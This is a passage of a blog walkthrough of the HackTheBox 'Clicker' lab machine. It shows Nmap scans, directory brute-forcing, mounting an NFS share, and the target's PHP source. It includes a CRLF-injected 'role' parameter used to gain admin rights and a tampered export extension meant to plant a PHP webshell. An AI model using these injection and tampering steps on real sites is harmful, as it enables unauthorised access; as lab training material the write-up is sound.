<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Clicker HTB Walkthrough · Chief Dennis&#39; Blog
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Dennis Drebitca">
<meta name="description" content="The Clicker HTB machine is a medium difficulty level HackTheBox Machine. The main techniques used to crack this machine are:
- SQL Injection- CRLF Injection- Parameter Tampering- PHP Reverse Shell- Perl_startup Local Privilege EscalationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
sudo nmap -sS -T5 -vvv -p- 10.10.11.232 -Pn -oG nmap_inicial Where the arguments mean:
-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:">
<meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">

<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Clicker HTB Walkthrough"/>
<meta name="twitter:description" content="The Clicker HTB machine is a medium difficulty level HackTheBox Machine. The main techniques used to crack this machine are:
- SQL Injection- CRLF Injection- Parameter Tampering- PHP Reverse Shell- Perl_startup Local Privilege EscalationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
sudo nmap -sS -T5 -vvv -p- 10.10.11.232 -Pn -oG nmap_inicial Where the arguments mean:
-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:"/>

<meta property="og:title" content="Clicker HTB Walkthrough" />
<meta property="og:description" content="The Clicker HTB machine is a medium difficulty level HackTheBox Machine. The main techniques used to crack this machine are:
- SQL Injection- CRLF Injection- Parameter Tampering- PHP Reverse Shell- Perl_startup Local Privilege EscalationReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
sudo nmap -sS -T5 -vvv -p- 10.10.11.232 -Pn -oG nmap_inicial Where the arguments mean:
-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chiefdennis.github.io/posts/htb_clicker/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-11-27T13:07:16+01:00" />
<meta property="article:modified_time" content="2023-11-27T13:07:16+01:00" />






<link rel="canonical" href="https://chiefdennis.github.io/posts/htb_clicker/">


<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.min.e1bdf152d93b060b06ba5d496486ed9c201a8b95d335e035beb5faebe3b61cad.css" integrity="sha256-4b3xUtk7BgsGul1JZIbtnCAai5XTNeA1vrX66&#43;O2HK0=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 
  
    
    <link rel="stylesheet" href="/css/custom.min.2a79daf6f50f047418cd5f1adc44afa5a9ae0e8b4a05eb7e390d42591bde2719.css" integrity="sha256-Knna9vUPBHQYzV8a3ESvpamuDotKBet&#43;OQ1CWRveJxk=" crossorigin="anonymous" media="screen" />
  





<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="/">
      Chief Dennis&#39; Blog
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="/about/">About</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="/posts/">Catch The Flag</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="/projects/">Projects</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="/contact/">Contact me</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://chiefdennis.github.io/posts/htb_clicker/">
              Clicker HTB Walkthrough
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa fa-calendar" aria-hidden="true"></i>
              <time datetime="2023-11-27T13:07:16&#43;01:00">
                November 27, 2023
              </time>
            </span>
            <span class="reading-time">
              <i class="fa fa-clock-o" aria-hidden="true"></i>
              7-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa fa-user" aria-hidden="true"></i>
    <a href="/authors/dennis-drebitca/">Dennis Drebitca</a></div>

          
          <div class="tags">
  <i class="fa fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="/tags/sql-injection/">SQL Injection</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/crlf-injection/">CRLF Injection</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/parameter-tampering/">Parameter Tampering</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/php-reverse-shell/">PHP Reverse Shell</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="/tags/perl_startup-local-privilege-escalation/">Perl_startup Local Privilege Escalation</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <p><img src="clicker.jpg" alt="image"></p>
<p>The Clicker HTB machine is a medium difficulty level HackTheBox Machine. The main techniques used to crack this machine are:</p>
<pre><code>- SQL Injection
- CRLF Injection
- Parameter Tampering
- PHP Reverse Shell
- Perl_startup Local Privilege Escalation
</code></pre>
<h2 id="reconnaissance">
  Reconnaissance
  <a class="heading-link" href="#reconnaissance">
    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>We start a broad Nmap scan by executing the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -T5 -vvv -p- 10.10.11.232 -Pn -oG nmap_inicial
</span></span></code></pre></div><p>Where the arguments mean:</p>
<pre><code>-sS: SYN port scan
-T5: Using timing template 5 of NMAP
-vvv: Triple verbose so NMAP prints a lot of information
-p-: All ports are scanned
-Pn: Skips Host Discovery
-oG: Grep Format
</code></pre>
<p>The scan returns the following information:</p>
<p><img src="1.png" alt="image"></p>
<p>It looks like there is a lot of open ports. Now we run another NMAP scan, now with the intent of discovering what services are running on these ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sCV -p22,80,111,2049,36995,45521,48513,50555,54721 10.10.11.232 -oN nmap_exhaustivo -v
</span></span></code></pre></div><p>Now the arguments used mean:</p>
<pre><code>-sCV: Launches all scanning scripts to discover services and versions running on these ports
-oN: Normal output format
-v: Single verbose
</code></pre>
<p>The results for this second scan are the following:</p>
<p><img src="3.png" alt="image"></p>
<p>The usuall SSH and HTTP ports are open. Now lets try to enumerate subdirectories via brute force with Feroxbuster. First, we add the website to our /etc/hosts file and then we run the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">feroxbuster -u http://clicker.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></code></pre></div><p><img src="5.png" alt="image"></p>
<p>We discover a &ldquo;exports&rdquo; subdirectory, wich will be useful in the future. Now, lets access the webpage and see what is there.</p>
<p><img src="4.png" alt="image"></p>
<p>We can make an account, play the game and it saves our high score.</p>
<p><img src="7.png" alt="image"></p>
<p>Now, lets go back and revisit port 2049. It looks like there is a NFS and file sharing service running. We can try to access the files by copying and mounting the volume. First, we make a directory in /mnt/ by running:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mkdir -p /mnt/nfs_file_shares
</span></span></code></pre></div><p>Then we try to mount the volume by using the mount command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mount -o nolock 10.10.11.232:/ /mnt/nfs_ile_shares
</span></span></code></pre></div><p>There is a backup.zip file in the mounted volume</p>
<p><img src="8.png" alt="image"></p>
<h2 id="initial-access">
  Initial access
  <a class="heading-link" href="#initial-access">
    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>In this zip file there is the source code to the clicker game and web page. Inspecting the file authenticate.php, we can see that there is a parameter called role, which can be set to Admin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">(</span><span class="s2">&#34;db_utils.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">check_auth</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;PLAYER&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$profile</span> <span class="o">=</span> <span class="nx">load_profile</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;NICKNAME&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;ROLE&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">&#34;role&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;CLICKS&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;LEVEL&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /login.php?err=Authentication Failed&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>The contents of export.php also gives us a hint that there is a role named &ldquo;Admin&rdquo;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">(</span><span class="s2">&#34;db_utils.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;ROLE&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;Admin&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">die</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">random_string</span><span class="p">(</span><span class="nv">$length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keys</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">),</span> <span class="nx">range</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span> <span class="o">.=</span> <span class="nv">$keys</span><span class="p">[</span><span class="nx">array_rand</span><span class="p">(</span><span class="nv">$keys</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$threshold</span> <span class="o">=</span> <span class="mi">1000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;threshold&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;threshold&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$threshold</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;threshold&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">get_top_players</span><span class="p">(</span><span class="nv">$threshold</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$currentplayer</span> <span class="o">=</span> <span class="nx">get_current_player</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;PLAYER&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;txt&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s2">&#34;Nickname: &#34;</span><span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Clicks: &#34;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Level: &#34;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$player</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s2">&#34;Nickname: &#34;</span><span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Clicks: &#34;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Level: &#34;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;json&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$currentplayer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;table&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;thead&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;col&#34;&gt;Nickname&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;col&#34;&gt;Clicks&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;col&#34;&gt;Level&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/thead&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;tbody&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;row&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$player</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;row&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/tbody&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/table&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;exports/top_players_&#34;</span> <span class="o">.</span> <span class="nx">random_string</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;.&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /admin.php?msg=Data has been saved in &#39;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>So we try to add the parameter &lsquo;role=Admin&rsquo; in the request.</p>
<p><img src="9.png" alt="image"></p>
<p>However, the script wont let us, obviously.</p>
<p><img src="10.png" alt="image"></p>
<p>Lets try to break this check. Investiganting the strtolower() function used to make the comparison, it is vulnerable to CRLF injection (<a href="https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a%29"  class="external-link" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)</a>. Now when we inject &lsquo;role%0d%0a=Admin&rsquo;, it doesnt display that message.</p>
<p><img src="11.png" alt="image"></p>
<p>Now we log out and log in, and a new Administration panel now shows up.</p>
<p><img src="12.png" alt="image"></p>
<p>Here we can check and export high scores. It saves it on the machine. I wonder if we can somehow upload a php webshell.</p>
<p><img src="13.png" alt="image"></p>
<p>Inspecting the request sent by clicking Export, there is a parameter called &rsquo;extension&rsquo;.</p>
<p><img src="14.png" alt="image">
<img src="15.png" alt="image">
Modifying it, we can change the extension to php.</p>
<p><img src="16.png" alt="image">
And it works! Checking out the file:</p>
<p><img src="17.png" alt="image"></p>
<p>Now, lets look again at the contents of export.php:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">(</span><span class="s2">&#34;db_utils.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;ROLE&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;Admin&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">die</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">random_string</span><span class="p">(</span><span class="nv">$length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keys</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">),</span> <span class="nx">range</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span> <span class="o">.=</span> <span class="nv">$keys</span><span class="p">[</span><span class="nx">array_rand</span><span class="p">(</span><span class="nv">$keys</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
